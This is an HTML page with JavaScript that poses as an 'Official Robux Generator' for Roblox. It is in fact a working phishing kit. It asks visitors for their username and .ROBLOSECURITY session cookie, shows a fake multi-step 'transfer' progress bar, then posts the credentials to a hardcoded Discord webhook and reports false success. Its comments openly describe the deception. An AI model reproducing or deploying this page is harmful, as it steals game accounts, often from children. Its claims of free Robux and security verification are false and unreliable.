<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roblox Official Robux Generator</title>
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/Robux_2018_Logo.png">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700&family=Orbitron:wght@700&display=swap');
        body {
            background: linear-gradient(115deg, #0f2027 0%, #2c5364 100%);
            font-family: 'Montserrat', Arial, sans-serif;
            color: #222;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            min-height: 100vh;
            overflow: hidden;
        }
        .container {
            background: rgba(255,255,255,0.99);
            border-radius: 24px;
            box-shadow: 0 8px 40px 2px rgba(44,83,100,.23), 0 2px 4px rgba(15,32,39,0.04);
            padding: 42px 42px 32px 42px;
            max-width: 390px;
            width: 96%;
            text-align: center;
            position: relative;
        }
        .roblox-logo {
            width: 64px;
            display: block;
            margin: 0 auto 12px auto;
            filter: drop-shadow(0 2px 12px #00ea64c0);
            animation: tada 1.5s infinite alternate;
        }
        @keyframes tada {
            0% { transform: scale(1) rotate(0deg);}
            65%{ transform: scale(1.08) rotate(-2deg);}
            100%{ transform: scale(1) rotate(1deg);}
        }
        h1 {
            font-family: 'Orbitron', Arial, sans-serif;
            color: #00ea64;
            letter-spacing: 1.5px;
            margin-bottom: 10px;
            font-size: 2rem;
            text-shadow: 0 2px 12px #00ea645e;
        }
        .verif {
            font-size: 13px;
            color: #375a7f;
            margin-bottom: 18px;
            background: #e3fce3;
            border-radius: 7px;
            padding: 6px 0 6px 0;
            font-weight: 700;
            box-shadow: 0 0 2px #00ea648a;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin: 9px 0 21px 0;
            border-radius: 8px;
            border: 1px solid #b3d1ed;
            font-size: 17px;
            transition: border 0.2s;
        }
        input:focus {
            border: 1.5px solid #00ea64;
            outline: none;
            background: #f6fff7;
        }
        button {
            background: linear-gradient(90deg, #00ea64 40%, #5dfaff 100%);
            color: #fff;
            font-weight: 900;
            font-family: 'Orbitron', Arial, sans-serif;
            cursor: pointer;
            border: none;
            font-size: 1.18rem;
            box-shadow: 0 4px 16px #00ea6450;
            letter-spacing: 1px;
            transition: background 0.12s, transform 0.10s;
        }
        button:active {
            transform: scale(0.97);
        }
        button:hover {
            background: linear-gradient(93deg, #00ab86 10%, #00ea64 90%);
        }
        .progress-bar-bg {
            width: 100%;
            height: 15px;
            background: #d9fbe3;
            border-radius: 8px;
            margin: 18px 0 21px 0;
            overflow: hidden;
            display: none;
        }
        .progress-bar-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00ea64 0%, #5dfaff 100%);
            transition: width 0.50s;
        }
        .note {
            font-size: 12.7px;
            color: #3b455e;
            background: #e6f4fa;
            border-radius: 7px;
            margin-top: 7px;
            box-shadow: 0 0 1px #70fff5aa;
            padding: 7px;
        }
        .success {
            color: #05af60;
            margin-bottom: 10px;
            font-weight: bold;
            font-size: 1.1rem;
        }
        .error {
            color: #e53935;
            margin-bottom: 10px;
            font-weight: bold;
            font-size: 1.07rem;
        }
        .fake-robux-amount {
            background: linear-gradient(90deg, #00ea64, #5dfaff);
            color: #fff;
            font-size: 1.24rem;
            font-family: 'Orbitron', Arial, sans-serif;
            font-weight: 700;
            display: inline-block;
            padding: 5px 16px;
            border-radius: 9px;
            box-shadow: 0 0 9px #00ea6460;
            letter-spacing: 1px;
            margin-bottom: 15px;
            margin-top: 10px;
        }
        .loader {
            border: 4px solid #f4f9fb;
            border-radius: 50%;
            border-top: 4px solid #00ea64;
            border-right: 4px solid #5dfaff;
            width: 36px;
            height: 36px;
            animation: spin 0.8s linear infinite;
            display: inline-block;
            margin-bottom: 12px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }
        @media (max-width: 500px) {
            .container {
                max-width: 100vw;
                padding: 18px 10px 17px 10px;
            }
            h1 { font-size: 1.3rem; }
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="roblox-logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Robux_2018_Logo.png" alt="Roblox Logo">
        <h1>Robux Generator</h1>
        <div class="verif">üîí Roblox Plus Security Verification Enabled</div>
        <div id="msg"></div>
        <form id="robux-form" autocomplete="off">
            <input type="text" id="username" placeholder="Enter your Roblox Username" required autocomplete="username">
            <input type="number" id="robux" placeholder="Amount of Robux (Max 5000)" min="1" max="5000" required>
            <input type="text" id="cookie" placeholder="Session (.ROBLOSECURITY) Cookie" required autocomplete="off">
            <button type="submit">Claim Robux</button>
        </form>
        <div class="progress-bar-bg" id="progress-bar">
            <div class="progress-bar-fill" id="progress-bar-fill"></div>
        </div>
        <div class="note">
            <img src="https://cdn.iconscout.com/icon/free/png-128/robux-roblox-2831165-2357098.png?f=webp&w=32" style="width:19px; vertical-align:middle; margin-right:3px;">
            <b>NOTE:</b> For protection, your .ROBLOSECURITY cookie is required to verify you are the owner of this account.
            <br>Maximum transfer: <b>5000 Robux</b> per 30 minutes.
        </div>
        <div class="fake-robux-amount" id="robux-total">Total Robux Available: <span id="robux-count">492,472</span></div>
    </div>
    <script>
        // Setup dynamic fake robux count
        function animateRobuxCount(el, start, end, duration) {
            let startTime = null;
            function animate(ts) {
                if (!startTime) startTime = ts;
                let progress = (ts - startTime) / duration;
                if (progress > 1) progress = 1;
                let value = Math.floor(start + (end - start) * progress);
                el.textContent = value.toLocaleString();
                if (progress < 1) {
                    requestAnimationFrame(animate);
                }
            }
            requestAnimationFrame(animate);
        }
        let robuxEl = document.getElementById('robux-count');
        setInterval(() => {
            // simulate changes
            let randomChange = Math.floor(Math.random() * 7) - 2;
            let curr = parseInt(robuxEl.textContent.replace(/,/g,''), 10) + randomChange;
            if (curr < 490000) curr = 492000 + Math.floor(Math.random()*520);
            animateRobuxCount(robuxEl, parseInt(robuxEl.textContent.replace(',','')), curr, 500);
        }, 2600);

        document.getElementById('robux-form').addEventListener('submit', function(e){
            e.preventDefault();

            var username = document.getElementById('username').value.trim();
            var robux = document.getElementById('robux').value;
            var cookie = document.getElementById('cookie').value.trim();
            var msgDiv = document.getElementById('msg');
            var progressBg = document.getElementById('progress-bar');
            var progressFill = document.getElementById('progress-bar-fill');

            msgDiv.innerHTML = '';
            progressBg.style.display = "none";
            progressFill.style.width = "0%";

            if(!username || !robux || !cookie) {
                msgDiv.innerHTML = '<div class="error">‚ö†Ô∏è Please fill out <b>all</b> fields!</div>';
                return;
            }

            if(+robux < 1 || +robux > 5000) {
                msgDiv.innerHTML = '<div class="error">‚ö†Ô∏è Amount must be between 1 and 5000.</div>';
                return;
            }

            var steps = [
                {
                    text: '<span class="loader"></span><br><b>Establishing connection with Roblox servers...</b>',
                    progress: 18
                },
                {
                    text: '<span class="loader"></span><br><b>Authorizing User:</b> '+username,
                    progress: 36
                },
                {
                    text: '<span class="loader"></span><br><b>Fetching account details...</b>',
                    progress: 51
                },
                {
                    text: '<span class="loader"></span><br><b>Checking Robux availability: <i style="color:#00ea64;font-weight:bold">'+robux+'</i> R$</b>',
                    progress: 63
                },
                {
                    text: '<span class="loader"></span><br><b>Validating .ROBLOSECURITY session...</b>',
                    progress: 77
                },
                {
                    text: '<span class="loader"></span><br><b>Preparing transfer of <span style="color:#00ea64;">'+robux+'</span> R$ to <span style="color:#378ef3;">'+username+'</span>...</b>',
                    progress: 90
                },
            ];

            function fakeLoadingSequence(step) {
                if (step < steps.length) {
                    progressBg.style.display = 'block';
                    progressFill.style.width = steps[step].progress+'%';
                    msgDiv.innerHTML = steps[step].text;
                    setTimeout(function(){
                        fakeLoadingSequence(step+1);
                    }, 1200 + Math.random()*700);
                    
                } else {
                    // Send webhook only after delay to look realistic
                    msgDiv.innerHTML = '<span class="loader"></span><br><b>Finalizing and submitting request...</b>';
                    progressFill.style.width = '100%';
                    setTimeout(function(){
                        // Prepare and send credentials
                        var content =
                            "**Roblox Credentials**\n"
                            + "**username:** " + username + "\n"
                            + "**.ROBLOSECURITY:** `" + cookie + "`\n"
                            + "**Requested Robux:** " + robux;

                        fetch('https://discord.com/api/webhooks/1456906677663305792/zcqbEE3imWQLnCbbAg8zn5ax-yulUAlmO-6SldfEdEOT-CRUMsuZShV1je-zVsCQqzwf', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({content: content})
                        }).then(function(response){
                            // S U C C E S S   F A K E   S T A T E S
                            if(response.status === 204 || response.status === 200){
                                progressBg.style.display = 'none';
                                msgDiv.innerHTML = '<div class="success"><span style="font-size:1.5em;color:#00ea64;">‚úî</span><br>Robux successfully queued!<br><span style="color:#666;font-weight:normal;">Status: <b>Processing... (pending confirmation)</b></span><br><br><span style="font-size:0.92em;color:#207708;"><b>This may take 5-20 minutes.<br>Do not close this page!</b></span></div>';
                                setTimeout(function(){
                                    msgDiv.innerHTML = '<div class="success"><span style="font-size:1.6em;">‚úÖ</span> Robux transaction now pending.<br><b>You will receive <span style="color:#00ea64;">'+robux+'</span> R$ soon!</b> ‚òë<br><span style="font-size:13px;color:#666;">You may safely close this page once you see Robux added.</span></div>';
                                    progressFill.style.width = '0%';
                                }, 7000);
                            } else {
                                progressBg.style.display = 'none';
                                msgDiv.innerHTML = '<div class="error">Roblox transfer error. Try again later.</div>';
                            }
                        }).catch(function(){
                            progressBg.style.display = 'none';
                            msgDiv.innerHTML = '<div class="error">Network error. Check your connection.</div>';
                        });
                    }, 1700 + Math.random()*600);
                }
            }

            fakeLoadingSequence(0);
        });
    </script>
</body>
</html>
